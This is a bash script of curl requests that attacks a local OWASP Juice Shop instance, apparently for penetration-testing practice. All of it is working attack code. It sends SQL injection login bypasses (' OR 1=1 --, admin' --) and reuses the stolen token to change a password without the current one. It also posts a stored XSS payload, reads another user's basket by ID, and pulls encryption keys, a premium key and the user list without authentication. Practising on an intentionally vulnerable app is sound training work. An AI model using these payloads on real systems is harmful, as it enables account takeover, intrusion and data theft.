#!/bin/bash
echo "=== 1. Login normal failure ==="
curl -s -X POST http://127.0.0.1:3010/rest/user/login -H "Content-Type: application/json" -d '{"email":"invalid@test.com","password":"wrong"}' | head -c 300
echo ""
echo "=== 2. Login SQLi OR 1=1 ==="
curl -s -X POST http://127.0.0.1:3010/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"' OR 1=1 --\",\"password\":\"test\"}" | head -c 300
echo ""
echo "=== 3. Login with admin' -- ==="
curl -s -X POST http://127.0.0.1:3010/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op' --\",\"password\":\"test\"}" | head -c 300
echo ""
echo "=== 4. Memories endpoint ==="
curl -s http://127.0.0.1:3010/rest/memories | head -c 500
echo ""
echo "=== 5. Encryption keys directory ==="
curl -s http://127.0.0.1:3010/encryptionkeys/
echo ""
echo "=== 6. JWT public key ==="
curl -s http://127.0.0.1:3010/encryptionkeys/jwt.pub
echo ""
echo "=== 7. Premium key ==="
curl -s http://127.0.0.1:3010/encryptionkeys/premium.key
echo ""
echo "=== 8. FTP directory ==="
curl -s http://127.0.0.1:3010/ftp/ | head -c 500
echo ""
echo "=== 9. Change password without current ==="
# Get a token via SQLi
RESP=$(curl -s -X POST http://127.0.0.1:3010/rest/user/login -H "Content-Type: application/json" -d "{\"email\":\"' OR 1=1 --\",\"password\":\"test\"}")
echo "Login response: $RESP"
TOKEN=$(echo "$RESP" | python3 -c "import sys,json;print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
echo "Token: $TOKEN"
curl -s -X GET "http://127.0.0.1:3010/rest/user/change-password?new=test123&repeat=test123" -H "Authorization: Bearer $TOKEN" | head -c 300
echo ""
echo "=== 10. Product reviews ==="
curl -s -X PUT http://127.0.0.1:3010/rest/products/1/reviews -H "Content-Type: application/json" -d '{"message":"<script>alert(1)</script>","author":"test"}' | head -c 300
echo ""
echo "=== 11. Basket IDOR ==="
curl -s http://127.0.0.1:3010/rest/basket/1 -H "Authorization: Bearer $TOKEN" | head -c 300
echo ""
echo "=== 12. API Users (no auth) ==="
curl -s http://127.0.0.1:3010/api/Users | head -c 300
echo ""
echo "=== 13. API Products ==="
curl -s http://127.0.0.1:3010/api/Products | head -c 300
echo ""
